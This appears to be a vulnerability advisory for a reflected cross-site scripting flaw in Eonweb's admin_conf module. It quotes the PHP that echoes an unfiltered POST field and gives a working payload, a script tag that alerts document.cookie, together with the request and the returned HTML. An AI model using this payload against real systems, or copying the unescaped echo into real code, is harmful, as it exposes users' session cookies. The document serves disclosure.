@@ -1,0 +1,37 @@
+Eonweb_module_admin_conf_index cross-site scripting (XSS)
+Powered by shaojiejiang from 360 SkyEye Labs
+version: 5.1
+https://github.com/EyesOfNetworkCommunity/eonweb
+
+Vulnerability details
+
+# 0x01
+module/admin_conf/index.php Line 107
+
+	<?php
+	if(isset($_POST["object"])){
+		include("./request.php");
+		echo "<p class='alert alert-info'><i class='fa fa-info-circle'></i> File : <a href=\"./download.php?file=".$_POST["object"].".csv\">".$_POST["object"]."</a></p>";
+		createFile( $_POST["object"],$request[$_POST["object"]] );
+	}
+	?>
+
+$_POST["object"] has not been filtered to cause cross-site scripting (XSS)
+
+EXP:
+
+
+URL：                     https://192.168.227.169/module/admin_conf/index.php
+post data:                object=templates<script>alert(document.cookie)</script>
+
+
+
+the return page has the payload:
+
+<p class='alert alert-info'><i class='fa fa-info-circle'></i> File : <a href="./download.php?file=templates<script>alert(document.cookie)</script>.csv">templates<script>alert(document.cookie)</script></a></p><div class='dataTable_wrapper'><table class='table table-striped datatable-eonweb'>
+				<thead>
+					<tr>		</tr>
+				</thead>
+				<tbody>	</tbody>
+			  </table>
+			  </div>
